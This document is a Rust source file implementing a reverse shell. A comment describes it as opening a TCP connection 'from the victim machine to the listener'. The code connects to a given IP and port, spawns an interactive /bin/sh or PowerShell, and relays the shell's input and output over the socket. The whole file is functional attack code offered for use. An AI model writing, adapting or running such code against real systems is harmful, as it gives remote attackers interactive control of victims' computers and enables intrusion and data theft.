use crate::errors::TCPError;
use anyhow::{self, Context};
use std::{
    net::{IpAddr, SocketAddr},
    process::Stdio,
    str::FromStr,
};
use tokio::{
    io::{BufReader, BufWriter},
    net::{TcpSocket, TcpStream},
    process::Command,
};

/// Run function tu run the reverse shell
/// It creates a TCP socket from the victim machine to the listener
///
/// Args:
/// - ip: ip address to connect to
/// - port: port to bind to the ip address
pub async fn run(ip: &str, port: u16) -> anyhow::Result<()> {
    let addr: SocketAddr = SocketAddr::new(
        IpAddr::from_str(ip)
            .with_context(|| format!("Failed to convert the string: {ip} to an IP address"))?,
        port,
    );

    // Socket creation and connection to the listener
    let socket: TcpSocket = match TcpSocket::new_v4().context("Failed to create socket") {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Error creating socket: {}", e);
            return Err(TCPError::SocketCreationFailure(e).into());
        }
    };

    let stream: TcpStream = match socket
        .connect(addr)
        .await
        .context("Failed to connect to the listener")
    {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Failed to connect to {}: {}", addr, e);
            return Err(TCPError::ConnectionFailure(addr).into());
        }
    };

    println!("Connected to {}", addr);

    // Defines standard input and standard output of the stream
    let (reader, writer) = stream.into_split();
    let mut socket_stdin = BufReader::new(reader);
    let mut socket_stdout = BufWriter::new(writer);

    let command: &str = if cfg!(target_os = "windows") {
        "powershell.exe"
    } else {
        "/bin/sh"
    };

    // Spawning a shell as a child process inheriting stdin, stdout and stderr come the parent process
    let mut child = Command::new(command)
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("Failed to spawn child process")?;

    // The parent process takes controll of the shell stdin, stdout and stderr
    let mut stdin = child.stdin.take().expect("Stdin unavailable");
    let mut stdout = child.stdout.take().expect("Stdout unavailable");
    let mut stderr = child.stderr.take().expect("Stderr unavailable");

    // Async task to handle stdin reading/writing
    tokio::spawn(async move {
        tokio::io::copy(&mut socket_stdin, &mut stdin)
            .await
            .expect("Failed to copy from socket to stdin");
    });

    // Async task to handle stdout reading/writing
    tokio::spawn(async move {
        tokio::io::copy(&mut stdout, &mut socket_stdout)
            .await
            .expect("Failed to copy from stderr to socket");
        tokio::io::copy(&mut stderr, &mut socket_stdout)
            .await
            .expect("Failed to copy from stderr to socket");
    });

    child.wait().await.context("Child process failed")?;

    Ok(())
}
